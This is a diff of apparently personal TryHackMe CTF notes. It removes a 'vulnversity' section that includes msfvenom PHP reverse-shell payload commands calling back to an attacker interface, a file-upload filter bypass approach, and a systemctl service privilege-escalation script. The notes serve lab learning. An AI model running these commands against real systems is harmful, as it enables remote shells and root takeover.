@@ -36,26 +36,6 @@ https://tryhackme.com/room/linprivesc
 
 ## Overconfidence
 
---- https://tryhackme.com/room/vulnversity
-
-* Capture a request uploading a file
-* Intruder to test which filetype is not blocked
-* `msfvenom -p php/reverse_php LHOST=tun0 LPORT=4444 -o mrevshell.phtml`
-  * No one can make it work!!!
-* `msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o mrevshell_php_rtcp.phtml`
-
-```bash
-TF=$(mktemp).service
-echo "[Service]
-Type=oneshot
-ExecStart=/bin/sh -c '$@ > /tmp/output'
-[Install]
-WantedBy=multi-user.target" > $TF
-systemctl -f link $TF
-systemctl -f enable --now $TF
-cat /tmp/output
-```
-
 --- https://tryhackme.com/room/steelmountain
 
 * use meterpreter upload to upload the winPEAS
